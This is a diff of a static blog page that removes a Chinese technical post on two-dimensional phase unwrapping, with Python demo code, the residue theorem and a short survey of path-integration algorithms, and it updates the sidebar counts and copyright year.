-              <h1 id="二维相位去包裹：路径积分法">二维相位去包裹：路径积分法</h1><p>本文介绍几种基于路径积分的二维相位展开方法。这只是个预告，表示这几天没有闲着。</p>
-<p>##为什么二维相位展开会发生问题？</p>
-<h3 id="Itoh’s算法的二维扩展">Itoh’s算法的二维扩展</h3><p>Itoh’s一维相位展开算法很容易扩展到二维。</p>
-<p>我们可以先对第一列进行解包裹，然后在此基础上对每行进行解包裹，整个相位图像就都能被解包裹了。</p>
-<p>我把扩展的itoh’s算法函数写在util中并导入</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> util <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> mpl_toolkits.mplot3d <span class="keyword">import</span> axes3d</span><br></pre></td></tr></table></figure>
-<p>获取实验相位函数。我随便选的，应该没问题吧……</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">X, Y, Z = axes3d.get_test_data(<span class="number">0.05</span>)</span><br><span class="line">Z_origin = Z.copy()</span><br><span class="line">plt.figsize(<span class="number">10</span>,<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">plt.subplot(<span class="number">121</span>)</span><br><span class="line">plt.title(<span class="string">"origin phase"</span>)</span><br><span class="line">plt.imshow(Z, cmap=<span class="string">'gray'</span>)</span><br><span class="line">ax = plt.gca()</span><br><span class="line">ax.set_axis_off()</span><br><span class="line">colorbar(shrink=<span class="number">.40</span>)</span><br><span class="line"></span><br><span class="line">plt.subplot(<span class="number">122</span>)</span><br><span class="line">plt.title(<span class="string">"wraped phase"</span>)</span><br><span class="line">ax = plt.gca()</span><br><span class="line">ax.set_axis_off()</span><br><span class="line">Z = wrap(Z)</span><br><span class="line">plt.imshow(Z, cmap=<span class="string">'gray'</span>)</span><br><span class="line">colorbar(shrink=<span class="number">.40</span>)</span><br></pre></td></tr></table></figure>
-<p><img src="http://raw.github.com/reverland/phase-unwrapping-notes/master/image/2-d-itoh.jpg" alt="原始相位和包裹相位"></p>
-<p>紧接着用itoh的方法解包裹</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Z = raster_unwrap2(Z)</span><br><span class="line"></span><br><span class="line">plt.figsize(<span class="number">10</span>,<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">plt.subplot(<span class="number">121</span>)</span><br><span class="line">ax = plt.gca()</span><br><span class="line">ax.set_axis_off()</span><br><span class="line">plt.title(<span class="string">"unwraped phase"</span>)</span><br><span class="line">plt.imshow(Z, cmap=<span class="string">'gray'</span>)</span><br><span class="line">colorbar(shrink=<span class="number">.40</span>)</span><br><span class="line"></span><br><span class="line">plt.subplot(<span class="number">122</span>)</span><br><span class="line">ax = plt.gca()</span><br><span class="line">ax.set_axis_off()</span><br><span class="line">plt.title(<span class="string">"erro map"</span>)</span><br><span class="line">plt.imshow(Z - Z_origin, cmap=<span class="string">'gray'</span>)</span><br><span class="line">colorbar(shrink=<span class="number">.40</span>, ticks=<span class="keyword">None</span>)</span><br><span class="line">np.all(np.abs((Z - Z_origin) &lt; <span class="number">1e-8</span>))</span><br></pre></td></tr></table></figure>
-<p><img src="http://raw.github.com/reverland/phase-unwrapping-notes/master/image/raster-unwrap.jpg" alt="解包裹相位和误差图"></p>
-<p>正如我们所见，这算法效果很好。但是如果数据点出了点问题的话……</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Z = wrap(Z)</span><br><span class="line"></span><br><span class="line">x = np.random.randint(<span class="number">0</span>,<span class="number">120</span>,<span class="number">100</span>)</span><br><span class="line">y = np.random.randint(<span class="number">0</span>,<span class="number">120</span>,<span class="number">100</span>)</span><br><span class="line">Z[x,y] = random.random() * <span class="number">3</span></span><br><span class="line"></span><br><span class="line">plt.subplot(<span class="number">131</span>)</span><br><span class="line">ax = plt.gca()</span><br><span class="line">ax.set_axis_off()</span><br><span class="line">plt.title(<span class="string">"noisy wraped phase"</span>)</span><br><span class="line">plt.imshow(Z, cmap=<span class="string">'gray'</span>)</span><br><span class="line">colorbar(shrink=<span class="number">.25</span>)</span><br><span class="line"></span><br><span class="line">Z = raster_unwrap2(Z)</span><br><span class="line"></span><br><span class="line">plt.subplot(<span class="number">132</span>)</span><br><span class="line">plt.title(<span class="string">"noisy unwraped phase"</span>)</span><br><span class="line">ax = plt.gca()</span><br><span class="line">ax.set_axis_off()</span><br><span class="line">plt.imshow(Z, cmap=<span class="string">'gray'</span>)</span><br><span class="line">colorbar(shrink=<span class="number">.25</span>)</span><br><span class="line"></span><br><span class="line">np.all((Z == Z_origin))</span><br><span class="line"></span><br><span class="line">plt.subplot(<span class="number">133</span>)</span><br><span class="line">plt.imshow(Z-Z_origin, cmap=<span class="string">'gray'</span>)</span><br><span class="line">ax = plt.gca()</span><br><span class="line">ax.set_axis_off()</span><br><span class="line">plt.title(<span class="string">"error map"</span>)</span><br><span class="line">colorbar(shrink=<span class="number">.25</span>)</span><br></pre></td></tr></table></figure>
-<p><img src="http://raw.github.com/reverland/phase-unwrapping-notes/master/image/raster-unwrap-noise.jpg" alt="带噪音情况"></p>
-<p>我加了一些随机噪声，结果就悲剧了。查看误差图给我们了一些启示。在某些出问题的点同一行又边全都出了问题。这种解包裹误差不断扩大并形成一条线的现象，<em>似乎</em> 叫做 <em>拉线</em> 现象(我瞎说的，只是有文献提到过拉线现象，也可能就是这个吧……)。</p>
-<p>如果我们对Itoh算法换一种方式扩展。先对第一行解包裹，再在此基础上对各个列解包裹。如果没有有问题的点。结果和第一种扩展方式一样。这给我们个启示，我们可以在任意方向进行相位去包裹，但只要碰到出问题的点都会在之后的积分路径中出现问题。</p>
-<p>如果要解包裹出正确的相位，必须绕过这些奇点(有问题的点)。</p>
-<p>事实上，相位解包裹领域借用了高等数学和复变函数分析里的理论和观点，并最终形成了相位解包裹问题的留数定理。</p>
-<h3 id="相位去包裹留数定理">相位去包裹留数定理</h3><p>要想解包裹与路径无关，必须有：</p>
-<p>$$\oint \nabla \varphi(r) \cdot dr = 2\pi \times \text{(sum of enclosed residue charges)}$$</p>
-<p>在数字图像中，最小的环路是2X2大小的四个像素，如下图所示。通过计算$\sum_{i=1}^4\Delta_i$是否为零，为零则无留数，否则此区域内有正或负留数。实际上，这些有问题的点留数通常不会为0。</p>
-<p><img src="http://raw.github.com/reverland/phase-unwrapping-notes/master/image/residue.png" alt="留数计算示意"></p>
-<p>为了在任意方向上能进行正确的解包裹，必须想办法使环路内的留数和为0,让积分路径(也是解包裹的路径)绕过这些留数不为0的奇点。</p>
-<p>之后所提到的，我所看到的一些路径积分方法。都是通过尽量在可靠的地方进行相位展开(即积分),想办法绕开可能造成问题的点，或平衡这些造成问题的点。</p>
-<p>之后做好准备看看那些大牛们发展出的各种路径积分算法吧。我已经佩服的五体投地了。这复杂程度已经让个人Keep it simple， stupid的人生哲学彻底崩坏。各路人马的算法涉及大量数学理论、信号处理理论(mask、noise filter、quality map)、图形形态学操作(开闭操作、连通性判断)、图论(分支切割算法)、最小生成树……完全看跪了……如果你准备动手实践，为了提高时间和空间效率，还有涉及可能是算法设计的东西吧[^1]。</p>
-<h2 id="几种路径积分算法">几种路径积分算法</h2><h3 id="Goldstein_分支切割(branch_cut)算法">Goldstein 分支切割(branch cut)算法</h3><p>该算法旨在用最短的路径平衡正负留数，设置解包裹时的障碍，使解包裹路径能按照正确的方向进行。总体上说，该算法相当高效，很容易查看效果。但跟质量图没关系，很容易错误的放置障碍，导致错误的积分路径。</p>
-<h3 id="质量引导(quality-guided)算法">质量引导(quality-guided)算法</h3><p>先积分质量高的地方，后积分质量低的地方，这基本能保证解包裹路径的正确。这个算法和留数没关系，所以不能保证不出错。但如果有个非常好的质量图，结果相当棒。另外，效率也不错。</p>
-<h3 id="掩码分支(mask)算法">掩码分支(mask)算法</h3><p>前两种算法的杂交，通过某种方法沿着质量最低的地方扩展mask，最后解包裹时绕过这些mask。同上方法，没有好的质量图就别去试。</p>
-<h3 id="flynn最小断点算法">flynn最小断点算法</h3><p>很直观的算法。就是把不连续的部分通过增加整数倍个$2\pi$变得连续，虽然说起来没这么简单。该算法用了个生成树，效果很好，还可以用质量图获得更好的效果……</p>
-<h2 id="Off-Topic">Off-Topic</h2><p>相位去包裹笔记放在<a href="https://github.com/reverland/phase-unwrapping-notes" target="_blank" rel="external">这里</a>。</p>
-<h2 id="Footnotes">Footnotes</h2><p>[^1]:在 <em>Data Analysis with Open Source Tools</em> 一书中推荐过 <em>一本书叫如何设计算法</em> ，应该值得一看。</p>
-
-            
-          </span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
 
   </section>
 
@@ -1974,7 +2134,7 @@ $ gem install <span class="keyword">bundler</span>
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">175</span>
+              <span class="site-state-item-count">176</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -1988,7 +2148,7 @@ $ gem install <span class="keyword">bundler</span>
 
           <div class="site-state-item site-state-tags">
             <a href="/tags">
-              <span class="site-state-item-count">61</span>
+              <span class="site-state-item-count">62</span>
               <span class="site-state-item-name">标签</span>
               </a>
           </div>
@@ -2108,7 +2268,7 @@ $ gem install <span class="keyword">bundler</span>
         <div class="copyright" >
   
   &copy;  2011 - 
-  <span itemprop="copyrightYear">2015</span>
+  <span itemprop="copyrightYear">2016</span>
   <span class="with-love">
     <i class="icon-next-heart fa fa-heart"></i>
   </span>
